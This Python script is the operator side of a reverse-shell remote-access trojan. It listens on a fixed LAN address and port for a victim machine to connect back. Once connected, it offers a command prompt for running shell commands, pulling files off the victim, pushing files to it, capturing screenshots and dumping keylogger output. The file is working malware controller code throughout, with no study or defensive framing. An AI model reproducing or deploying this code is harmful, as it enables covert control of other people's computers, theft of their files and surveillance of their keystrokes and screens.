#!/usr/bin/python3
import socket
from termcolor import colored
import json
import base64


def increment():
    global value
    value += 1

value = 0

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
    
   
def reliable_recv():
    data = " "
    while True:
        try:
            data = data + (target.recv(1024)).decode('utf-8')
            return json.loads(data)
        except ValueError:
            continue
            
def shell():
    while True:
        command = input(colored("[*] Shell#~%s: " % str(ip), 'red'))
        reliable_send(command)
        if command == 'q':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command[:3] == 'get':
            result = reliable_recv()
            print(result)
        elif command[:8] == 'download':
            with open(command[9:], 'wb') as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            try:
                with open(command[7:], 'r') as file:
                    data = file.read()
                    reliable_send(data)
                    print('Uploaded Successfully')
            except:
                print("Failed to read")
        elif command[:10] == 'screenshot':
            increment()
            with open('screenshot%d' % value, 'wb') as screen:
                image = reliable_recv()
                image_decoded = (base64.b64decode(image))
                if image_decoded[:4] == '[!!]':
                    print(image_decoded)
                else:
                    screen.write(image_decoded)
        elif command[:12] == 'keylog_start':
            continue
        elif command[:11] == 'keylog_dump':
            result = reliable_recv()
            print(result)
        else:
            result = reliable_recv()
            print(result)
            
            
def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.95.127", 54321))
    s.listen(5)
    print(colored("[+] Listening for incoming connections: ", 'green'))
    target, ip = s.accept()
    print(colored("[+] Connection Established from: %s" %str(ip), 'green'))
    
server()
shell()
s.close()
